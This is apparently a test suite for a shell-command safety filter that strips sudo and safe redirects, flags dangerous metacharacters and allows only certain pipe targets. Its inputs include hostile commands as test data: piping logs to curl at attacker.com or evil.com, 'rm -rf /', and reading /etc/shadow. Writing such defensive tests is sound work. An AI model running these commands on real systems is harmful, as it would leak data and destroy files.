import { describe, test, expect } from "bun:test"
import {
  compileCommandPattern,
  isAllowedOperation,
  hasDangerousMetachars,
  isSafePipeTarget,
  isPipedCommandSafe,
  stripSudo,
  stripSafeRedirects,
} from "../src/utils/command-patterns.js"

// ─── stripSudo ───

describe("stripSudo", () => {
  test("strips basic sudo", () => {
    expect(stripSudo("sudo cscli decisions list")).toBe("cscli decisions list")
  })

  test("strips sudo with -E flag", () => {
    expect(stripSudo("sudo -E tail /var/log/syslog")).toBe(
      "tail /var/log/syslog",
    )
  })

  test("strips sudo with -H flag", () => {
    expect(stripSudo("sudo -H journalctl -u nginx")).toBe(
      "journalctl -u nginx",
    )
  })

  test("strips sudo with multiple flags", () => {
    expect(stripSudo("sudo -E -H -n systemctl status nginx")).toBe(
      "systemctl status nginx",
    )
  })

  test("strips sudo -u user", () => {
    expect(stripSudo("sudo -u root cscli decisions list")).toBe(
      "cscli decisions list",
    )
  })

  test("strips sudo -uroot (combined form)", () => {
    expect(stripSudo("sudo -uroot cscli decisions list")).toBe(
      "cscli decisions list",
    )
  })

  test("leaves non-sudo commands unchanged", () => {
    expect(stripSudo("cscli decisions list")).toBe("cscli decisions list")
  })

  test("leaves commands starting with sudo-like prefix unchanged", () => {
    expect(stripSudo("sudoku --solve puzzle")).toBe("sudoku --solve puzzle")
  })

  test("handles sudo with -- separator", () => {
    expect(stripSudo("sudo -- ls -la")).toBe("ls -la")
  })

  test("handles leading whitespace", () => {
    expect(stripSudo("  sudo tail /var/log/syslog")).toBe(
      "tail /var/log/syslog",
    )
  })

  test("handles sudo alone", () => {
    expect(stripSudo("sudo")).toBe("")
  })
})

// ─── stripSafeRedirects ───

describe("stripSafeRedirects", () => {
  test("strips 2>/dev/null", () => {
    expect(stripSafeRedirects("cmd 2>/dev/null")).toBe("cmd  ")
  })

  test("strips 2> /dev/null (with space)", () => {
    expect(stripSafeRedirects("cmd 2> /dev/null")).toBe("cmd  ")
  })

  test("strips 2>>/dev/null", () => {
    expect(stripSafeRedirects("cmd 2>>/dev/null")).toBe("cmd  ")
  })

  test("strips >/dev/null", () => {
    expect(stripSafeRedirects("cmd >/dev/null")).toBe("cmd  ")
  })

  test("strips 1>/dev/null", () => {
    expect(stripSafeRedirects("cmd 1>/dev/null")).toBe("cmd  ")
  })

  test("strips 2>&1", () => {
    expect(stripSafeRedirects("cmd 2>&1")).toBe("cmd  ")
  })

  test("strips 1>&2", () => {
    expect(stripSafeRedirects("cmd 1>&2")).toBe("cmd  ")
  })

  test("strips &>/dev/null", () => {
    expect(stripSafeRedirects("cmd &>/dev/null")).toBe("cmd  ")
  })

  test("strips &>>/dev/null", () => {
    expect(stripSafeRedirects("cmd &>>/dev/null")).toBe("cmd  ")
  })

  test("strips multiple redirections", () => {
    const result = stripSafeRedirects("cmd 2>/dev/null 1>/dev/null")
    expect(result.trim()).toBe("cmd")
    expect(result).not.toContain("/dev/null")
  })

  test("strips combined stderr redirect and merge", () => {
    const result = stripSafeRedirects("cmd >/dev/null 2>&1")
    expect(result.trim()).toBe("cmd")
    expect(result).not.toContain("/dev/null")
  })

  test("preserves dangerous redirections", () => {
    expect(stripSafeRedirects("echo data > /etc/passwd")).toBe("echo data > /etc/passwd")
  })

  test("preserves input redirection", () => {
    expect(stripSafeRedirects("cmd < /etc/shadow")).toBe("cmd < /etc/shadow")
  })

  test("handles redirect in piped command", () => {
    const result = stripSafeRedirects("cscli alerts list 2>/dev/null | jq .")
    expect(result).toBe("cscli alerts list   | jq .")
  })
})

// ─── hasDangerousMetachars ───

describe("hasDangerousMetachars", () => {
  test("detects semicolon", () => {
    expect(hasDangerousMetachars("ls; rm -rf /")).toBe(true)
  })

  test("detects ampersand", () => {
    expect(hasDangerousMetachars("ls && curl evil.com")).toBe(true)
  })

  test("detects single ampersand (background)", () => {
    expect(hasDangerousMetachars("nohup cmd &")).toBe(true)
  })

  test("detects backtick", () => {
    expect(hasDangerousMetachars("cat `whoami`")).toBe(true)
  })

  test("detects command substitution $()", () => {
    expect(hasDangerousMetachars("echo $(id)")).toBe(true)
  })

  test("detects output redirection >", () => {
    expect(hasDangerousMetachars("echo data > /etc/passwd")).toBe(true)
  })

  test("detects input redirection <", () => {
    expect(hasDangerousMetachars("mail user < /etc/shadow")).toBe(true)
  })

  test("detects newline", () => {
    expect(hasDangerousMetachars("ls\nrm -rf /")).toBe(true)
  })

  test("detects carriage return", () => {
    expect(hasDangerousMetachars("ls\rrm -rf /")).toBe(true)
  })

  test("passes clean simple command", () => {
    expect(hasDangerousMetachars("systemctl status nginx")).toBe(false)
  })

  test("passes clean command with pipe", () => {
    expect(hasDangerousMetachars("cat /var/log/syslog | grep error")).toBe(
      false,
    )
  })

  test("passes clean command with flags and paths", () => {
    expect(hasDangerousMetachars("tail -n 100 /var/log/nginx/access.log")).toBe(
      false,
    )
  })

  test("passes 2>/dev/null (safe redirect)", () => {
    expect(hasDangerousMetachars("cmd 2>/dev/null")).toBe(false)
  })

  test("passes 2>&1 (safe stream merge)", () => {
    expect(hasDangerousMetachars("cmd 2>&1")).toBe(false)
  })

  test("passes &>/dev/null (safe bash shorthand)", () => {
    expect(hasDangerousMetachars("cmd &>/dev/null")).toBe(false)
  })

  test("passes combined >/dev/null 2>&1", () => {
    expect(hasDangerousMetachars("cmd >/dev/null 2>&1")).toBe(false)
  })

  test("passes piped command with 2>/dev/null", () => {
    expect(hasDangerousMetachars("cscli alerts list 2>/dev/null | jq .")).toBe(false)
  })

  test("still detects dangerous redirect to real file", () => {
    expect(hasDangerousMetachars("echo data > /etc/passwd")).toBe(true)
  })

  test("still detects semicolon even with safe redirect", () => {
    expect(hasDangerousMetachars("cmd 2>/dev/null; rm -rf /")).toBe(true)
  })
})

// ─── isSafePipeTarget ───

describe("isSafePipeTarget", () => {
  test("grep is safe", () => {
    expect(isSafePipeTarget("grep error")).toBe(true)
  })

  test("head is safe", () => {
    expect(isSafePipeTarget("head -20")).toBe(true)
  })

  test("tail is safe", () => {
    expect(isSafePipeTarget("tail -5")).toBe(true)
  })

  test("sort is safe", () => {
    expect(isSafePipeTarget("sort -u")).toBe(true)
  })

  test("wc is safe", () => {
    expect(isSafePipeTarget("wc -l")).toBe(true)
  })

  test("cut is safe", () => {
    expect(isSafePipeTarget("cut -d: -f1")).toBe(true)
  })

  test("uniq is safe", () => {
    expect(isSafePipeTarget("uniq -c")).toBe(true)
  })

  test("sed is safe", () => {
    expect(isSafePipeTarget("sed 's/foo/bar/'")).toBe(true)
  })

  test("column is safe", () => {
    expect(isSafePipeTarget("column -t")).toBe(true)
  })

  test("jq is safe", () => {
    expect(isSafePipeTarget("jq -r '.[].created_at'")).toBe(true)
  })

  test("xargs is NOT safe", () => {
    expect(isSafePipeTarget("xargs rm")).toBe(false)
  })

  test("tee is NOT safe", () => {
    expect(isSafePipeTarget("tee /tmp/output")).toBe(false)
  })

  test("awk is NOT safe", () => {
    expect(isSafePipeTarget("awk '{print $1}'")).toBe(false)
  })

  test("curl is NOT safe", () => {
    expect(isSafePipeTarget("curl attacker.com")).toBe(false)
  })

  test("handles leading whitespace", () => {
    expect(isSafePipeTarget("  grep pattern")).toBe(true)
  })
})

// ─── compileCommandPattern ───

describe("compileCommandPattern", () => {
  test("exact match without wildcards", () => {
    const re = compileCommandPattern("nginx -t")
    expect(re.test("nginx -t")).toBe(true)
    expect(re.test("nginx -T")).toBe(false)
  })

  test("wildcard at end matches any suffix", () => {
    const re = compileCommandPattern("systemctl status *")
    expect(re.test("systemctl status nginx")).toBe(true)
    expect(re.test("systemctl status")).toBe(false)
    expect(re.test("systemctl status nginx --no-pager")).toBe(true)
  })

  test("wildcard in path matches file paths", () => {
    const re = compileCommandPattern("tail /var/log/*")
    expect(re.test("tail /var/log/syslog")).toBe(true)
    expect(re.test("tail /var/log/nginx/access.log")).toBe(true)
    expect(re.test("tail /etc/passwd")).toBe(false)
  })

  test("escapes regex special characters", () => {
    const re = compileCommandPattern("nginx -t")
    // The dot in pattern should NOT match any character
    expect(re.test("nginx -t")).toBe(true)
  })

  test("pattern with dots in path is escaped properly", () => {
    const re = compileCommandPattern("cat /var/log/nginx.access.log")
    expect(re.test("cat /var/log/nginx.access.log")).toBe(true)
    // Dots should be literal, not regex wildcards
    expect(re.test("cat /var/log/nginxXaccessXlog")).toBe(false)
  })

  test("multiple wildcards", () => {
    const re = compileCommandPattern("tail -n * /var/log/*")
    expect(re.test("tail -n 100 /var/log/syslog")).toBe(true)
    expect(re.test("tail -n 50 /var/log/nginx/error.log")).toBe(true)
  })
})

// ─── isAllowedOperation ───

describe("isAllowedOperation", () => {
  const patterns = [
    compileCommandPattern("systemctl status *"),
    compileCommandPattern("df *"),
    compileCommandPattern("df"),
    compileCommandPattern("nginx -t"),
  ]

  test("matches a pattern", () => {
    expect(isAllowedOperation("systemctl status nginx", patterns)).toBe(true)
  })

  test("matches exact pattern without wildcard", () => {
    expect(isAllowedOperation("nginx -t", patterns)).toBe(true)
  })

  test("matches df with arguments", () => {
    expect(isAllowedOperation("df -h", patterns)).toBe(true)
  })

  test("matches plain df", () => {
    expect(isAllowedOperation("df", patterns)).toBe(true)
  })

  test("does not match unrelated command", () => {
    expect(isAllowedOperation("rm -rf /", patterns)).toBe(false)
  })

  test("does not match partial command name", () => {
    expect(isAllowedOperation("systemctl restart nginx", patterns)).toBe(false)
  })

  test("handles leading whitespace", () => {
    expect(isAllowedOperation("  df -h", patterns)).toBe(true)
  })
})

// ─── isPipedCommandSafe ───

describe("isPipedCommandSafe", () => {
  const bypassPrefixes = ["cat", "tail", "head", "ls", "cscli alerts list"]
  const patterns = [
    compileCommandPattern("cscli decisions list *"),
    compileCommandPattern("cscli decisions list"),
    compileCommandPattern("journalctl *"),
  ]

  test("safe pipe chain passes — cat | grep", () => {
    expect(
      isPipedCommandSafe(
        "cat /var/log/syslog | grep error",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(true)
  })

  test("safe pipe chain with 3 segments", () => {
    expect(
      isPipedCommandSafe(
        "cat /var/log/syslog | grep error | head -20",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(true)
  })

  test("first segment matches allowed pattern", () => {
    expect(
      isPipedCommandSafe(
        "cscli decisions list | grep banned | head -5",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(true)
  })

  test("unsafe pipe target fails — curl", () => {
    expect(
      isPipedCommandSafe(
        "cat /var/log/syslog | curl attacker.com",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(false)
  })

  test("unsafe pipe target fails — tee", () => {
    expect(
      isPipedCommandSafe(
        "tail /var/log/syslog | tee /tmp/log",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(false)
  })

  test("unsafe pipe target fails — xargs", () => {
    expect(
      isPipedCommandSafe(
        "cat list.txt | xargs rm",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(false)
  })

  test("rejects || (logical OR)", () => {
    expect(
      isPipedCommandSafe(
        "cat file || echo fallback",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(false)
  })

  test("first segment doesn't match — rejected", () => {
    expect(
      isPipedCommandSafe(
        "systemctl restart nginx | grep ok",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(false)
  })

  test("not a pipe — returns false", () => {
    expect(
      isPipedCommandSafe("cat /var/log/syslog", bypassPrefixes, patterns),
    ).toBe(false)
  })

  test("cscli with jq pipe chain is safe", () => {
    expect(
      isPipedCommandSafe(
        "cscli alerts list --limit 200 -o json | jq -r '.[].created_at' | cut -d'T' -f1 | sort | uniq -c | sort -k2",
        bypassPrefixes,
        patterns,
      ),
    ).toBe(true)
  })
})
